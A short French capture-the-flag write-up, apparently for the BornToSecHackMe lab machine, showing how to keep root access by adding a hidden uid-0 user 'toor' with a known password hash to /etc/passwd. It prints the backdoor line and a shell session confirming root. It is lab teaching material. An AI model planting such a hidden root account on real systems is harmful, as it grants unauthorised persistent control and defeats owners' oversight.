## BONUS1

Ce premier bonus est aussi simple que bonjour. Pour pouvoir tout simplement de nouveau se connecter sur la machine en tant que root nous allons tout simplement rajouter un user dans le fichier /etc/passwd, caché entre tous les users avec les privileges root et un password simple:

Pour cela il faudra bien evidemment deja etre connecté en tant que root afin de pouvoir ecrire sur le fichier comme on veut.

```
toor:fi86Ixhn/lTi2:0:0:pwned:/root:/bin/bash // Ici le mdp correspond a 'q'
```

De ce fait quand nous retournerons sur l'user laurie nous pourrons nous relog en tant que root grace a la combinaison toor/q

```
laurie@BornToSecHackMe:~$ su toor
Password:
root@BornToSecHackMe:/home/laurie# id
uid=0(root) gid=0(root) groups=0(root)
root@BornToSecHackMe:/home/laurie#
```

Super simple
